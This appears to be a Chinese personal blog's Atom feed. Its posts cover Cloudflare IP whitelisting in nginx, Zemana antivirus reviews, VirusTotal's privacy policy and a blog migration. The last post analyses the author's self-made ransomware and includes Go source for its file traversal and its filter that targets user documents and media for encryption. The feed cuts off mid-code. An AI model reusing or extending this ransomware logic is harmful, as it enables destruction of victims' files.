<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Note of bobo</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://bobo.moe/"/>
  <updated>2018-02-20T12:26:06.734Z</updated>
  <id>https://bobo.moe/</id>
  
  <author>
    <name>bobo liu</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Welcome to Note of bobo</title>
    <link href="https://bobo.moe/post/index/"/>
    <id>https://bobo.moe/post/index/</id>
    <published>2018-02-08T16:00:00.000Z</published>
    <updated>2018-02-20T12:26:06.734Z</updated>
    
    <content type="html"><![CDATA[<p>Hello, 这里是又双叒 (ruo) 叕(zhuo)一次新建成的作死日志。</p><p>此次重建放弃了难用至极的 Wikitten，看起来有一位同学于我有相同的想法，并创作了 <a href="https://github.com/zthxxx/hexo-theme-Wikitten" target="_blank" rel="noopener">该 hexo 主题</a>。<br>然后我削微的膜改了一下样式，就直接拿来用了：<a href="https://github.com/popu125/hexo-theme-Wikitten" target="_blank" rel="noopener">popu125/hexo-theme-Wikitten</a></p><p>在这几年里，我做了很多，写了很多，更删了很多，忘却了很多，剩下的，都是还没来得及忘却的东西。<br>这些遗留下的东西，很多已经遗失了日期，只得随口编一个上去，对错与否，重要么？</p><p>左侧是目录，还请随意翻看（如果有人会来这个小破网站的话）。</p><p>bobo liu 18/02/09</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Hello, 这里是又双叒 (ruo) 叕(zhuo)一次新建成的作死日志。&lt;/p&gt;
&lt;p&gt;此次重建放弃了难用至极的 Wikitten，看起来有一位同学于我有相同的想法，并创作了 &lt;a href=&quot;https://github.com/zthxxx/hexo-theme-W
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>正确地使用 Cloudflare 保护你的网站</title>
    <link href="https://bobo.moe/post/cf-true/"/>
    <id>https://bobo.moe/post/cf-true/</id>
    <published>2017-11-30T16:00:00.000Z</published>
    <updated>2018-02-20T12:22:25.097Z</updated>
    
    <content type="html"><![CDATA[<p>今天看到某不愿透露姓名的雨落无声同学在群里提到自己的网站被轮，最后只好上 cf。</p><p>有感于 cf 确实是防日的好工具的同时，在这里强调一下很多时候会被（上了 cf 就感觉万事大吉的）小站长们忽略的一个问题：*map 大法。</p><p>按照规矩，说问题应该先给 PoC，但这玩法实在太普及，就简单说一下原理：</p><blockquote><p>通过 nmap/zmap 之类的工具，扫描全网（如果能从网页确定网段那自然更棒），然后伪装 host 验证。</p></blockquote><p>这个玩意解决还是很简单的，只要做 ip 过滤就行了，以 nginx 为例：</p><p>先准备好 ip 白名单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载并处理 cf 的 ipv4 列表，并写入 / etc/nginx/cfv4.conf 文件 </span></span><br><span class="line">wget -O- https://www.cloudflare.com/ips-v4 |\</span><br><span class="line">sed -e <span class="string">"s/^/allow /"</span> -e <span class="string">'s/$/;/'</span> &gt; /etc/nginx/cfv4.conf</span><br><span class="line"><span class="comment"># 如有 v6 可执行，但是现在应该很少有人扫 v6 的就是了 </span></span><br><span class="line"><span class="comment"># wget -O- https://www.cloudflare.com/ips-v6 |\</span></span><br><span class="line"><span class="comment"># sed -e "s/^/allow /" -e 's/$/;/' &gt; /etc/nginx/cfv6.conf</span></span><br></pre></td></tr></table></figure><p>然后在你的 vhost 配置中加入</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">include</span> cfv4.conf;</span><br><span class="line"><span class="comment"># 如果有 v6</span></span><br><span class="line"><span class="comment"># include cfv6.conf;</span></span><br><span class="line"><span class="attribute">deny</span> all;</span><br></pre></td></tr></table></figure><p>这样基本的安全操作（之一）就完成啦~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;今天看到某不愿透露姓名的雨落无声同学在群里提到自己的网站被轮，最后只好上 cf。&lt;/p&gt;
&lt;p&gt;有感于 cf 确实是防日的好工具的同时，在这里强调一下很多时候会被（上了 cf 就感觉万事大吉的）小站长们忽略的一个问题：*map 大法。&lt;/p&gt;
&lt;p&gt;按照规矩，说问题应该先给
      
    
    </summary>
    
      <category term="经验" scheme="https://bobo.moe/categories/%E7%BB%8F%E9%AA%8C/"/>
    
    
  </entry>
  
  <entry>
    <title>Zemana Endpoint Security (ZES) 简单测评</title>
    <link href="https://bobo.moe/post/zes-test/"/>
    <id>https://bobo.moe/post/zes-test/</id>
    <published>2017-11-01T16:00:00.000Z</published>
    <updated>2018-02-20T12:23:52.415Z</updated>
    
    <content type="html"><![CDATA[<p>嘛，之前就看到了 ZES 出来了，但是一直没有下手。最新心情不佳，于是去忽悠了一下客服，得以入手 ZES 一年试用授权一枚，尽管应该没人会用，但还是试用并且记录一下，要不就浪费了授权了是吧。。。</p><h2 id="波折"><a href="#波折" class="headerlink" title="波折"></a>波折</h2><ul><li>客服给我发的是个错误的（而且过期很久的）下载链接，我给他发了三封邮件才拿到正确的。（恰逢周末，人家放假也没啥问题对吧。。。）</li><li>ZES 控制端要求 64 位服务器系统，我的辣鸡电脑要在 VM 里带动这玩意着实有点困难（主要是内存只有 4G，严重不足），而且我还需要一个测试终端用的虚拟机，性能就更不足了，最后只能一卡一卡地搞。。。</li></ul><hr><h2 id="正经测试时间"><a href="#正经测试时间" class="headerlink" title="正经测试时间"></a>正经测试时间</h2><h3 id="安装主控端"><a href="#安装主控端" class="headerlink" title="安装主控端"></a>安装主控端</h3><p>直接双击安装，安装界面省略（懒得截图了），不过看起来（似乎）挺正式的。</p><p>最后一步需要下载所有安装包，耗时极长，下载完之后还要加一个扩展名为 <code>.cfg</code> 的配置文件再压缩起来，内容如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"ControlCenterAddress"</span>: <span class="string">"127.0.0.1:55555"</span>,</span><br><span class="line">  <span class="attr">"Role"</span>: <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就 4 行，但是却食用了我大量的硬盘 IO（20MB/s），花了半个小时。。。令人极度怀疑是不是实现逻辑有问题。</p><h3 id="主控-web-管理"><a href="#主控-web-管理" class="headerlink" title="主控 web 管理"></a>主控 web 管理</h3><p>跟着客服提供的安装教程走，很快就到了打开浏览器看主控台的步骤，想想还有点小激动（雾），打开浏览器看一下：</p><p><img src="https://user-images.githubusercontent.com/7552030/32311336-0e91bae2-bfd3-11e7-9121-8cfe781376c3.png" alt="18"></p><p><img src="https://user-images.githubusercontent.com/7552030/32311338-0ef6879c-bfd3-11e7-8922-eb0676bce9f6.png" alt="19"></p><p><img src="https://user-images.githubusercontent.com/7552030/32311339-0f317d52-bfd3-11e7-935f-f3f28583439f.png" alt="20"></p><p>界面还是挺简洁的，扁平化做的也不错。这是我安装了终端之后的截图，但还是看不到终端上线，不知是不是我配置有问题。</p><h3 id="终端部署"><a href="#终端部署" class="headerlink" title="终端部署"></a>终端部署</h3><p>继续跟着教程走，在 web 面板点击下载。咦？怎么卡住了？虚拟机都卡死了？打开任务管理器一看：</p><p><img src="https://user-images.githubusercontent.com/7552030/32311324-0c81b48c-bfd3-11e7-97a8-8f53cf1c5f56.png" alt="7"></p><p>Emmmmm… 这文件都是现成的，怎么还需要那么大的读写的？这 web 服务器有毒吧？</p><p>终于开始下载了。。。</p><p><img src="https://user-images.githubusercontent.com/7552030/32319961-27b85016-bff7-11e7-81d2-4bd2b694b085.png" alt="default"></p><p>内网你给我搞出这个速度？这 web 服务器有毒吧？</p><h3 id="终端体验"><a href="#终端体验" class="headerlink" title="终端体验"></a>终端体验</h3><p>受不了卡出屎的感觉，直接从 IIS 的目录底下把安装包拖了出来，完美解决问题，安装一切顺利。这企业版的界面不知道比个人版高到哪里去了，Zemana 这么不在意个人用户的么？</p><p><img src="https://user-images.githubusercontent.com/7552030/32311335-0e619a4c-bfd3-11e7-8365-ec5565cd447d.png" alt="17"></p><p>作为一个老玩家，不打开目录仔细看看不就太过浪费了，让我们打开 <code>Signatures</code> 目录看看：</p><p><img src="https://user-images.githubusercontent.com/7552030/32319743-83307636-bff6-11e7-8967-fdc2620ad8a2.png" alt="default"></p><p>等等，这目录名好像不太对，，，让我打开看看</p><p>BD 库：</p><p><img src="https://user-images.githubusercontent.com/7552030/32319745-841dc22e-bff6-11e7-82c5-bf6e4874108e.png" alt="bdv"></p><p>AVC：</p><p><img src="https://user-images.githubusercontent.com/7552030/32319744-83abc5b6-bff6-11e7-8fa8-e0f7c2da99d2.png" alt="avc"></p><p>夭寿啦，Zemana 也加入 BD 系啦！连 AVC 都买啦！</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>本着 “作文应当有头有尾” 的原则，姑且写一个小结。</p><p>很明显 ZES 做的还是。。。很不错的（良心？不存在的），只是部分（很多）细节还需要进行打磨。</p><p>最后，ZAL 画风什么时候能现代化啊，好蛋疼。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;嘛，之前就看到了 ZES 出来了，但是一直没有下手。最新心情不佳，于是去忽悠了一下客服，得以入手 ZES 一年试用授权一枚，尽管应该没人会用，但还是试用并且记录一下，要不就浪费了授权了是吧。。。&lt;/p&gt;
&lt;h2 id=&quot;波折&quot;&gt;&lt;a href=&quot;#波折&quot; class=&quot;he
      
    
    </summary>
    
      <category term="手记" scheme="https://bobo.moe/categories/%E6%89%8B%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>Zemana 非官方技术白皮书</title>
    <link href="https://bobo.moe/post/zemana-white-book/"/>
    <id>https://bobo.moe/post/zemana-white-book/</id>
    <published>2017-11-01T16:00:00.000Z</published>
    <updated>2018-02-20T12:24:00.601Z</updated>
    
    <content type="html"><![CDATA[<p>Zemana 并没有提供官方的技术文档共下载（可能是因为根本拿不上台面吧），这里通过它提供的其他文档中透露出的信息，结合实际使用体验，做出对于其使用技术的解析。</p><h2 id="Pandora-Cloud-Sandbox"><a href="#Pandora-Cloud-Sandbox" class="headerlink" title="Pandora Cloud-Sandbox"></a>Pandora Cloud-Sandbox</h2><p>这个名字可以说是 Zemana 所有技术中名字最神秘也最令人难以理解的了，关于其本质的分析我曾在卡饭发布，这里再说一遍：</p><p>官方产品介绍手册（ZAL）</p><p><a href="http://dl9.zemana.com/Website_Media/Zemana%20AntiLogger%20brochure.pdf" target="_blank" rel="noopener">http://dl9.zemana.com/Website_Media/Zemana%20AntiLogger%20brochure.pdf</a></p><p>原文摘录如下：</p><blockquote><p>Pandora Sandbox<br>Each unknown file will be analyzed carefully in the cloud with Pandora<br>Technology before they execute on your PC. By using this technology on<br>your PC, any zero-day malware that wants to attack has no power!</p></blockquote><p>大意总结：</p><blockquote><p>当使用 Pandora 技术时，每一个未知的文件都会在运行前在云端被仔细分析</p></blockquote><p>官网提供的反勒索测试报告</p><p><a href="https://www.mrg-effitas.com/wp-content/uploads/2016/07/Zemana_ransomware_detection.pdf" target="_blank" rel="noopener">https://www.mrg-effitas.com/wp-content/uploads/2016/07/Zemana_ransomware_detection.pdf</a></p><p>原文摘录如下：</p><blockquote><p>Pandora works as a combination of cloud reputation database (blocking previously unknown files), and a cloud sandbox, where suspicious samples are sent to the cloud, and analyzed there. If a sample is detected as malicious, all Zemana users (even where Pandora is turned off) are protected in the future against that specific threat.</p></blockquote><p>大意总结：</p><blockquote><p>Pandora 是一个云信誉库和云沙盘的结合，可疑的样本将被发送到云端进行分析。如果样本有害，所有的 Zemana 用户将受到保护。</p></blockquote><p>结论：就是个没啥新意的云，名字起得不错</p><h2 id="扫描器的本质"><a href="#扫描器的本质" class="headerlink" title="扫描器的本质"></a>扫描器的本质</h2><p>曾有人问我 Zemana 的主防怎么样，我不太确定如何回答，因为它根本没有主防。官方对自己的定位很明确，在语言文件中可以看到：</p><blockquote><p>%s is a second opinion cloud-based malware scanner</p></blockquote><p>正如官方所言，无论是 ZAM 还是 ZAL，其本质都是一个“基于云的作为第二选择的病毒扫描器”。</p><h2 id="ID-Theft-Protection"><a href="#ID-Theft-Protection" class="headerlink" title="ID Theft Protection"></a>ID Theft Protection</h2><p>这个原翻译译作 “身份保护”，我称作“信息保护” 的东西，乍一看也很高大上，但实际上也不是什么新东西，就像 Pandora 一样。</p><p>根据 ZAL 产品文档的描述，这个组件被分成三个功能部分：</p><blockquote><ul><li>Secure SSL</li><li>Keystroke Logging Protection</li><li>System Intrusion Protection</li></ul></blockquote><p>前两个都不是很有趣，而最后一个 <code>System Intrusion Protection</code> 则看起来有点意思。在 ZAL 产品文档中，可以看到：</p><blockquote><p>The AntiLogger’s System Defense module secures the very heart of your PC in a future proof way: it detects malicious attempts based purely upon their behavior, regardless of whether or not the malware attacking you has been identified, isolated, analyzed and your anti­virus product updated.</p></blockquote><p>其中对于系统防护模块的表述给人有种基于行为判断的主防的感觉，但实际使用过程中并没有让人感觉到明显的行为主防痕迹，目前有待进一步的测试。</p><h2 id="剩下的"><a href="#剩下的" class="headerlink" title="剩下的"></a>剩下的</h2><p>什么？你还以为会有剩下的？要是还有剩下的内容的话，我想 Zemana 就会自己出白皮书大肆吹嘘了吧。。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Zemana 并没有提供官方的技术文档共下载（可能是因为根本拿不上台面吧），这里通过它提供的其他文档中透露出的信息，结合实际使用体验，做出对于其使用技术的解析。&lt;/p&gt;
&lt;h2 id=&quot;Pandora-Cloud-Sandbox&quot;&gt;&lt;a href=&quot;#Pandora-Clo
      
    
    </summary>
    
      <category term="手记" scheme="https://bobo.moe/categories/%E6%89%8B%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>关于 VirusTotal 隐私的几点讨论</title>
    <link href="https://bobo.moe/post/vt-privacy/"/>
    <id>https://bobo.moe/post/vt-privacy/</id>
    <published>2017-08-09T16:00:00.000Z</published>
    <updated>2018-02-20T12:23:05.787Z</updated>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>我想在座的各位可能还有不太清楚 VT 的隐私条款的，正好在下也在这上面吃了点小亏，于是谈一谈。</p><h2 id="收集数据"><a href="#收集数据" class="headerlink" title="收集数据"></a>收集数据</h2><p>如果有人总是在看各大安全媒体的话，应该能注意到之前 VirusTotal 搞出来的诸如 “木马作者通过 VT 检测免杀，VT 辅助追踪” 之类的新闻。对此我特意去看了一下 VT 的隐私条例，原文引用如下：</p><blockquote><p>Information we collect to provide you with the services includes:</p><ul><li><strong>Information you submit in connection with using our services</strong>. This includes the files, URLs, and other information you submit for scanning, information you provide when you join and participate in the VirusTotal community (such as profile information, comments, mentions, and votes), and any information you provide when contacting VirusTotal.</li><li><strong>Device information</strong>: We may collect device-specific information (such as your hardware model, operating system version, unique device identifiers, and mobile network information including phone number).</li><li><strong>Log information</strong>: When you use our services or view content provided by VirusTotal, we may automatically collect and store certain information in server logs. This may include: details of how you used our service; Internet protocol address; device event information such as crashes, system activity, hardware settings, browser type, standard HTTP request headers, including but not limited to user agent, referral URL, language preference, date and time; and cookies that may uniquely identify your browser or your VirusTotal Account.</li><li><strong>Payment information</strong>: To the extent you purchase any premium services offered by VirusTotal, we may collect or receive your credit card and other payment information. </li><li><strong>Cookies and Local Storage</strong>: We and our partners use various technologies to collect and store information when you visit the website, and this may include sending one or more cookies or randomly generated identifiers to your device. A cookie is a small file containing a string of characters that is sent to your computer when you visit a website. Cookies may store user preferences and other information. We use cookies to remember user preferences, such as language, provide users with customized experiences, based on account type, and to prevent abuse. We also use third-party analytics tools (including Google Analytics) to assist us with analysing and improving our services. The “help” portion of the toolbar on the majority of browsers will direct you on how to prevent your browser from accepting new cookies, how to command the browser to tell you when you receive a new cookie, or how to fully disable cookies. However, some of VirusTotal’s website features or services may not function properly without cookies. We may also collect and store information using mechanisms such as browser web storage (including HTML5) and application data caches.</li></ul></blockquote><p>简单来说就是收集的数据较之百度只多不少，而且百度还有拒绝收集的开关呢，VT 只会说不同意就滚。这样一比是不是突然感觉百度良心了一点？;)</p><p>而且毫无疑问你提交的文件会被 VT 所保存，而那些人会拿到你的文件呢？请往下看。</p><h2 id="数据使用"><a href="#数据使用" class="headerlink" title="数据使用"></a>数据使用</h2><blockquote><p>We use the information we collect from all of our services to provide, maintain, protect and improve them, to develop new services, and to protect VirusTotal and our users. </p><p>This includes using the information to:</p><ul><li>analyse and scan the files and other content you submit; </li><li>develop new services and service features;</li><li>create, publish and update the scan reports available on VirusTotal, including comments, mentions and trusted ratings; </li><li>develop and provide information to the VirusTotal Community; </li><li>create and administer your account; </li><li>understand and improve how our users use and interact with VirusTotal services;</li><li>protect and secure the VirusTotal site and services, including the networks and systems through which we provide the services; and </li><li>process payments for premium services offered by VirusTotal.</li></ul></blockquote><p>仅看到此的话似乎隐私状况还是很乐观的，但是继续看：</p><blockquote><p>Files, URLs, comments and any other content submitted to or shared within VirusTotal may also be included in premium services offered by VirusTotal to the anti-malware and ICT security industry, with the sole aim of improving research and development activities, expecting it to lead to an overall safer internet and greater end-user protection.  <strong>Participants include a broad range of cybersecurity professionals focused on product, service, and system security</strong> and security products and services. </p></blockquote><p>重点是加粗的那一句，简单翻译的话就是</p><blockquote><p>（文件分享的）参与者包括一个大范围的安全专家</p></blockquote><p>所以说，当我发现自己仅上传过 vt 测试的程序被扒下来当样本的时候我的内心毫无疑问是极度崩溃的。。。而回首一翻隐私条例发现，这 tm 还是我同意过的。。。请注意上传框下方的这一段话：</p><blockquote><p>By using VirusTotal you consent to our <a href="https://support.virustotal.com/hc/en-us/articles/115002145529-Terms-of-Service" target="_blank" rel="noopener">Terms of Service</a> and <a href="https://support.virustotal.com/hc/en-us/articles/115002168385-Privacy-Policy" target="_blank" rel="noopener">Privacy Policy</a> and allow us to share your submission with the security community.</p></blockquote><p>mmp</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;起因&quot;&gt;&lt;a href=&quot;#起因&quot; class=&quot;headerlink&quot; title=&quot;起因&quot;&gt;&lt;/a&gt;起因&lt;/h2&gt;&lt;p&gt;我想在座的各位可能还有不太清楚 VT 的隐私条款的，正好在下也在这上面吃了点小亏，于是谈一谈。&lt;/p&gt;
&lt;h2 id=&quot;收集数据&quot;&gt;&lt;a h
      
    
    </summary>
    
      <category term="手记" scheme="https://bobo.moe/categories/%E6%89%8B%E8%AE%B0/"/>
    
      <category term="随想" scheme="https://bobo.moe/categories/%E6%89%8B%E8%AE%B0/%E9%9A%8F%E6%83%B3/"/>
    
    
  </entry>
  
  <entry>
    <title>博客折腾记 (迁移到 Hugo 和 Gitment)</title>
    <link href="https://bobo.moe/post/move-to-hugo/"/>
    <id>https://bobo.moe/post/move-to-hugo/</id>
    <published>2017-06-07T16:00:00.000Z</published>
    <updated>2018-02-20T12:21:59.338Z</updated>
    
    <content type="html"><![CDATA[<p>自从放弃 Typecho 踏上静态化博客的不归路，我花在折腾上的时间似乎正变得越来越多，刚刚 (一个月之前) 完成了博客从 Hexo 到 Hugo 的迁移，折腾甚多但收获亦丰，希望与朱军共享之(朱军：干我屁事？)。</p><h2 id="关于-Hugo"><a href="#关于-Hugo" class="headerlink" title="关于 Hugo"></a>关于 Hugo</h2><p>Hugo 与 Hexo 相同，也是一个静态网页生成工具，只不过因为其是 Golang 写成，可以编译为可独立运行的二进制文件，故无论是携带使用还是随时升级都极为方便(虽然我也不会带着用它)</p><h2 id="关于评论"><a href="#关于评论" class="headerlink" title="关于评论"></a>关于评论</h2><p>之前在下偷懒使用了多说作评论(本来是 disqus 的，但是 disqus 喜欢强行引导用户注册帐号让人很不爽)，结果谁想天有不测风云… 本来就半死不活但似乎还能残喘不少时日的多说突然就嗝屁了，这挺萌的就尴尬了(＃°Д°)</p><p>本来打算使用一些成品的自建评论系统或者自己写一个来着，但是正巧在 V 站看到有人做的这个 Gitment，感觉很合适我的风格，于是干脆搞了一份下来，改改自己用。</p><p>以及这玩意是不违反 GayHub 的 TOS 的，具体看原 repo</p><h2 id="关于删博文"><a href="#关于删博文" class="headerlink" title="关于删博文"></a>关于删博文</h2><p>我的天每次看博客都被自己曾经发的各种二笔文章吓尿，于是果断借这次机会把他们都删干净啦&lt;(￣︶￣)↗</p><h2 id="关于友链"><a href="#关于友链" class="headerlink" title="关于友链"></a>关于友链</h2><p>这次的主题是基于超简洁主题 hyde 改得，弄得自己都不知道往哪里放友链来的合适，，，不过一定会想办法放上的。</p><h2 id="关于-Firebase"><a href="#关于-Firebase" class="headerlink" title="关于 Firebase"></a>关于 Firebase</h2><p>Firebase 是一个安卓的开发者云服务网站，现已加入 Google 豪华午餐。<br>Firebase 在提供各种服♂务的同时提供一个静态文件 hosting，空间比 COS 小，流量比 COS 少，部署比 COS 麻烦(需要翻)，有个 SSL 还是 LE 的，而且还是多域名一起签的。<br>不过，他家 CDN 是 Fastly 的，可以拿来看着装 13 啊~</p><p>好吧，成功扯远了。总之域名没有备案又不太能忍受 GayHub Pages 的速度的同志可以一试，速度还是不错的。至于我嘛，回头折腾够了应该会搬回 COS 吧。</p><h2 id="挖坑"><a href="#挖坑" class="headerlink" title="挖坑"></a>挖坑</h2><ul><li>如果可能的话写篇 Hugo 的简单教程(感觉这玩意没啥必要，文档很齐全)</li><li>YourRansom 作出了很多更新，重新写一篇源码分析，以及继续修改不优雅的代码</li><li>写一个 YourRansom 一键生成工具(我这是在找死吧。。。)</li></ul><p>17/06/08</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;自从放弃 Typecho 踏上静态化博客的不归路，我花在折腾上的时间似乎正变得越来越多，刚刚 (一个月之前) 完成了博客从 Hexo 到 Hugo 的迁移，折腾甚多但收获亦丰，希望与朱军共享之(朱军：干我屁事？)。&lt;/p&gt;
&lt;h2 id=&quot;关于-Hugo&quot;&gt;&lt;a href=
      
    
    </summary>
    
      <category term="手记" scheme="https://bobo.moe/categories/%E6%89%8B%E8%AE%B0/"/>
    
    
  </entry>
  
  <entry>
    <title>自制勒索有感 &amp; 技术简析</title>
    <link href="https://bobo.moe/post/ransom/"/>
    <id>https://bobo.moe/post/ransom/</id>
    <published>2017-01-09T16:00:00.000Z</published>
    <updated>2018-02-09T16:18:57.830Z</updated>
    
    <content type="html"><![CDATA[<p>嘛自从去年 10 月更过博客之后就啥都没写过了。。。这次正好趁着卫队搞新年活动写点什么。</p><p>前段时间在卡饭，勒索病毒是很火的一个讨论话题，而我也跟着一位大神的风写了一个简单的勒索病毒，这里写一点东西，作为纪念。</p><p>说起勒索病毒，其实它的行为和技术都很简单（除了某些硬肛硬盘的品种之外，当然我们今天讨论的只有普通的文件加密病毒，像 cerber 那样的）<br>其主要行为由遍历和加密两部分组成，下面在下使用自己的代码分析一下这两部分的实现（代码较渣还请原谅</p><p>首先是遍历，这一部分十分简单，不过还有一个很重要的问题需要注意：不要无脑。先前在下的第一版 YourRansom 就是因为无脑遍历进了系统文件夹还试图加密才被。。。<br>闲话不多说，先上代码：</p><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">do_cAll</span><span class="params">(path <span class="keyword">string</span>, cip cipher.Block, action <span class="keyword">byte</span>)</span> <span class="title">error</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取一下路径的信息 </span></span><br><span class="line">dir, serr := os.Stat(path)</span><br><span class="line"><span class="keyword">if</span> serr != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> serr</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断是否是个目录，如果不是就交给加(解) 密处理</span></span><br><span class="line"><span class="keyword">if</span> !dir.IsDir() &#123;</span><br><span class="line"><span class="keyword">if</span> action == <span class="string">'e'</span> &amp;&amp; !filter(path, action) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line">fmt.Println(<span class="string">"File:"</span>, path)</span><br><span class="line"><span class="keyword">switch</span> action &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'e'</span>:</span><br><span class="line">encrypt(path, cip)</span><br><span class="line"><span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">decrypt(path, cip)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//既然到这里了那就是个目录了，让我们继续遍历</span></span><br><span class="line">fmt.Println(<span class="string">"Path:"</span>, path)</span><br><span class="line"><span class="comment">//先打开这个目录</span></span><br><span class="line">fd, err := os.Open(path)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//获取到目录下前 100 个文件名</span></span><br><span class="line">names, err1 := fd.Readdirnames(<span class="number">100</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(names) == <span class="number">0</span> || err1 != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//为每一个文件名迭代一遍自身</span></span><br><span class="line"><span class="keyword">for</span> _, name := <span class="keyword">range</span> names &#123;</span><br><span class="line">do_cAll(path+<span class="keyword">string</span>(os.PathSeparator)+name, cip, action)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中为了防止无脑遍历我上了一个 filter 函数，用于判断传入的目录或文件名是否有关键词，以确认是否可以肛(虽然实现还是很无脑)：<br><figure class="highlight golang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">filter</span><span class="params">(path <span class="keyword">string</span>, action <span class="keyword">byte</span>)</span> <span class="title">bool</span></span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将传入的路径转为全小写，便于判断</span></span><br><span class="line">lowPath := strings.ToLower(path)</span><br><span class="line"></span><br><span class="line"><span class="comment">//屏蔽和加密后缀列表</span></span><br><span class="line">innerList := []<span class="keyword">string</span>&#123;<span class="string">"windows"</span>, <span class="string">"program"</span>, <span class="string">"appdata"</span>, <span class="string">"system"</span>&#125;</span><br><span class="line">suffixList := []<span class="keyword">string</span>&#123;<span class="string">".txt"</span>, <span class="string">".zip"</span>, <span class="string">".rar"</span>, <span class="string">".7z"</span>, <span class="string">".doc"</span>, <span class="string">".docx"</span>, <span class="string">".ppt"</span>, <span class="string">".pptx"</span>, <span class="string">".xls"</span>, <span class="string">".xlsx"</span>, <span class="string">".jpg"</span>, <span class="string">".gif"</span>, <span class="string">".jpeg"</span>, <span class="string">".png"</span>, <span class="string">".mpg"</span>, <span class="string">".mov"</span>, <span class="string">".mp4"</span>, <span class="string">".avi"</span>, <span class="string">".mp3"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断路径中是否包含敏感词(大雾)</span></span><br><span class="line"><span class="keyword">for</span> _, inner := <span class="keyword">range</span> innerList &#123;</span><br><span class="line"><span class="keyword">if</span> strings.Contains(lowPath, inner) &#123;</span><br><span class="line"><span class="comment">//如果存在就返回 false</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//判断路径是否以加密后缀结尾</span></span><br><span class="line"><span class="keyword">for</span> _, suffix := <span class="keyword">range</span> suffixList &#123;</span><br><span class="line"><span class="keyword">if</span> strings.HasSuffix(lowPath, suffix) &#123;</span><br><span class="line"><span class="comment">//如果是就返回 true</span></span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//既然到这里了那肯定就是既不包含敏感词，也没有加密后缀名的，还是 false</span></span><br><span class="line"><span 